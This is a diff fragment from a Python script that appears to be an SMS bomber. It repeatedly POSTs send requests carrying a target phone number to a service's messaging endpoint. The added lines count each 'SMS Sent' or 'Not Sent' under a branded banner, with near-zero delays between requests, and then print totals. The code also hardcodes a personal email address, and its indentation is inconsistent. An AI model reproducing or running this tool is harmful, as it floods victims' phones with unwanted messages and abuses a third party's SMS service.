@@ -97,3 +97,37 @@ while tt<2:
 					headers["Connection"] = "keep-alive"
 					data = """{\"requestType\":\"send\",\"phoneNumber\":\"+88"""+number+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"sanaur.asif@gmail.com\"}"""
 		                        r= requests.post(url, headers=headers, data=data)
+
+
+                                if ammount2==1:
+					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] 1st SMS Sent.")
+				elif ammount2==2:
+					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] 2nd SMS Sent.")
+				elif ammount2==3:
+					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] 3rd SMS Sent.")
+				else:
+					print(purple+"\n\t\t  ★★TaNviiR★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
+				time.sleep(0.00000000000000000000000000001)
+				totalsent+=1
+				ammount2+=1
+			except:
+				if ammount2==1:
+					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] 1st SMS Not Sent.")
+				elif ammount2==2:
+					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] 2nd SMS Not Sent.")
+				elif ammount2==3:
+					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] 3rd SMS Not Sent.")
+				else:
+					print(cyan+"\n\t\t  ★★TaNviiR★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
+					time.sleep(0.000000001)
+					ammount2+=1
+									
+								
+		totalhit=ammount2-1
+		totalnotsent=totalhit-totalsent
+		print(purple+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
+		print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
+		print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
+		lastt=str(input(purple+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue:\n"))
+		count=1
+	
